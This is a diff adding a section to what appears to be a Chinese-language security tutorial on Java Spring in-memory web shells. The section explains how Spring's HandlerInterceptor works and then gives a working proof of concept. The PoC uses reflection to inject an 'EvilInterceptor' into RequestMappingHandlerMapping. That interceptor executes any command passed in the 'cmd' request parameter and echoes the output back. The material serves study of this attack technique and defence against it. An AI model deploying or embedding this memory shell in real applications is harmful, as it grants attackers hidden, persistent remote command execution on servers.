@@ -8,6 +8,7 @@ categories:
 tags:
 - Network_Security
 - Java
+date: 2025-02-06 18:48:38
 ---
 
 # Java Spring 内存马入门
@@ -453,3 +454,108 @@ tags:
 
 ## 3. Spring Interceptor 内存马
 
+1. 前面学过 JavaWeb 的 Filter 内存马，SpringMVC 中的 Interceptor 拦截器就类似 Servlet 规范中的 Filter，拦截的是处理器的执行。
+    参考别人的文章，来学习一下 Interceptor 的一些细节：
+
+    > https://blog.csdn.net/zzuhkp/article/details/121242297
+
+    先来看看官方对其的介绍（重要的地方进行了翻译）：
+
+    > Workflow interface that allows for customized handler execution chains. Applications can register any number of existing or custom interceptors for certain groups of handlers, to add common preprocessing behavior without needing to modify each handler implementation.
+    >
+    > A HandlerInterceptor gets called before the appropriate HandlerAdapter triggers the execution of the handler itself. This mechanism can be used for a large field of preprocessing aspects, e.g. for authorization checks, or common handler behavior like locale or theme changes. Its main purpose is to allow for factoring out repetitive handler code.
+    >
+    > In an asynchronous processing scenario, the handler may be executed in a separate thread while the main thread exits without rendering or invoking the postHandle and afterCompletion callbacks. When concurrent handler execution completes, the request is dispatched back in order to proceed with rendering the model and all methods of this contract are invoked again. For further options and details see org.springframework.web.servlet.AsyncHandlerInterceptor
+    >
+    > Typically an interceptor chain is defined per HandlerMapping bean, sharing its granularity. To be able to apply a certain interceptor chain to a group of handlers, one needs to map the desired handlers via one HandlerMapping bean. The interceptors themselves are defined as beans in the application context, referenced by the mapping bean definition via its "interceptors" property (in XML: a `<list>` of `<ref>`).
+    >
+    > **通常来说，每一个 HandlerMapping bean （其实这里就能呼应为什么 Controller 马中 HandlerMapping 的获取会联想到 `context.getBean`）都会定义一个 interceptor chain，两者共享颗粒度（有点抽象，对具体指的什么感到模糊）。为了能够将一条明确的 interceptor chain 应用到一些 handler 上，开发者需要通过一个 HandlerMapping 来对应想要的 handler。这些 Interceptor 本身在 application context 中也被定义为 bean。**在 xml 中被一些标签定义。
+    >
+    > HandlerInterceptor is basically similar to a Servlet Filter, but in contrast to the latter it just allows custom pre-processing with the option of prohibiting the execution of the handler itself, and custom post-processing. Filters are more powerful, for example they allow for exchanging the request and response objects that are handed down the chain. Note that a filter gets configured in web.xml, a HandlerInterceptor in the application context.
+    >
+    > **HandlerInterceptor 基本上和 Servlet Filter 很像，但是相比于后者，其仅允许自定义 pre-processing (其可以禁止 handler 执行），或者自定义 post-processing。但 Filters 的功能则更为强大，例如 Filters 允许交换 request 和 response 对象，这些对象在链中被传递下去。PS：一个 filter 在 web.xml 中配置，而 HandlerInterceptor 在 application context 中配置。**
+    >
+    > As a basic guideline, fine-grained handler-related preprocessing tasks are candidates for HandlerInterceptor implementations, especially factored-out common handler code and authorization checks. On the other hand, a Filter is well-suited for request content and view content handling, like multipart forms and GZIP compression. This typically shows when one needs to map the filter to certain content types (e.g. images), or to all requests.
+
+2. Interceptor 三个方法具体的执行流程如下。
+
+    > `preHandle`：处理器执行之前执行，如果返回 false 将跳过处理器、拦截器 `postHandle` 方法、视图渲染等，直接执行拦截器 `afterCompletion` 方法。
+    > `postHandle`：处理器执行后，视图渲染前执行，如果处理器抛出异常，将跳过该方法直接执行拦截器 `afterCompletion` 方法。
+    > `afterCompletion`：视图渲染后执行，不管处理器是否抛出异常，该方法都将执行。
+    > 注意：自从前后端分离之后，SpringMVC 中的处理器方法执行后通常不会再返回视图，而是返回表示 json 或 xml 的对象，@Controller 方法返回值类型如果为 ResponseEntity 或标注了 @ResponseBody 注解，此时处理器方法一旦执行结束，Spring 将使用 `HandlerMethodReturnValueHandler` 对返回值进行处理，具体来说会将返回值转换为 json 或 xml，然后写入响应，后续也不会进行视图渲染，这时 `postHandle` 将没有机会修改响应体内容。
+    >
+    > 如果需要更改响应内容，可以定义一个实现 ResponseBodyAdvice 接口的类，然后将这个类直接定义到 RequestMappingHandlerAdapter 中的 requestResponseBodyAdvice 或通过 @ControllerAdvice 注解添加到 RequestMappingHandlerAdapter。
+
+### 3.1 Interceptor 流程分析
+
+1. 还是从 `DispatcherServlet#doDispatch` 出发，从中寻找相关的方法：
+    ![image-20250202151652124](Memory-Trojan-Spring/image-20250202151652124.png)
+    跟进 `mappedHandler.applyPreHandle()`，查看它的调用逻辑：
+    ![image-20250202154232157](Memory-Trojan-Spring/image-20250202154232157.png)
+    它从这个 `interceptorList` 中获取 `HandlerInterceptor`，因此写入逻辑就是在这里。
+    然后该方法的主体是 `mappedHandler`，这个对象的来源可以查看一下：
+    ![image-20250206153406599](Memory-Trojan-Spring/image-20250206153406599.png)
+    可以看到，这个对象是局部变量而非全局变量，不好通过反射写入，此时考虑寻找是否有官方写入的 API。其实上文的 Controller 内存马的研究中已经跟进了这个 `getHandler()`，深入跟进的话会来到：
+    ![image-20250206153733392](Memory-Trojan-Spring/image-20250206153733392.png)
+    可以看到这里的 `getHandlerExecutionChain()` 就是 `HandlerExecutionChain` （即 `mappedHandler` )的来源。跟进该方法，至此可以看到添加 Interceptor 的完全逻辑：
+    ![image-20250206154307204](Memory-Trojan-Spring/image-20250206154307204.png)
+    也就是说，每次请求的 `HandlerExecutionChain` 都是动态获取的，不过其来源本质上还是来自 `HandlerMapping` 的成员变量 `adaptedInterceptors`，那么现在的目标就是对其下手。
+
+### 3.2 PoC
+
+1. 本质就是通过反射修改 `HandlerMapping` 的成员变量 `adaptedInterceptors`，直接上 PoC：
+    ```java
+    /**
+     * 模拟靶场，访问即会触发
+     * 
+     * @return
+     * @throws Exception 
+     */
+    @ResponseBody
+    @GetMapping("/interceptor")
+    public String interceptor() throws Exception {
+        // 1. 拿到 HandlerMapping
+        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
+        if (context == null) {
+            return "inject fail!";
+        }
+        RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
+        // 2. 通过反射修改其内部变量 adaptedInterceptors
+        // 这里注意，要使用父类 AbstractHandlerMapping 的 class
+        Field adaptedInterceptorsField = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
+        adaptedInterceptorsField.setAccessible(true);
+        List<HandlerInterceptor> handlerInterceptors = (List<HandlerInterceptor>) adaptedInterceptorsField.get(requestMappingHandlerMapping);
+        handlerInterceptors.add(new EvilInterceptor());
+        adaptedInterceptorsField.set(requestMappingHandlerMapping, handlerInterceptors);
+    
+        return "interceptor done!";
+    }
+    
+    /**
+     * 恶意的 Interceptor
+     */
+    public class EvilInterceptor implements HandlerInterceptor {
+        @Override
+        public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
+            InputStream inputStream = Runtime.getRuntime().exec(request.getParameter("cmd").trim()).getInputStream();
+            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream, "GB2312"));
+            String line;
+            StringBuilder result = new StringBuilder();
+            while ((line = bufferedReader.readLine()) != null) {
+                result.append(line).append("\n");
+            }
+            bufferedReader.close();
+            inputStream.close();
+            System.out.println(result);
+            response.setCharacterEncoding("GB2312");
+            response.getWriter().write(result.toString().replaceAll("\n", "<\\br>"));
+            response.getWriter().flush();
+            response.getWriter().close();
+            HandlerInterceptor.super.postHandle(request, response, handler, modelAndView);
+        }
+    }
+    ```
+
+2. 首次访问后注入 interceptor，随后访问 404 页面时回显：
+    ![image-20250206184746773](Memory-Trojan-Spring/image-20250206184746773.png)
+    ![image-20250206184759938](Memory-Trojan-Spring/image-20250206184759938.png)
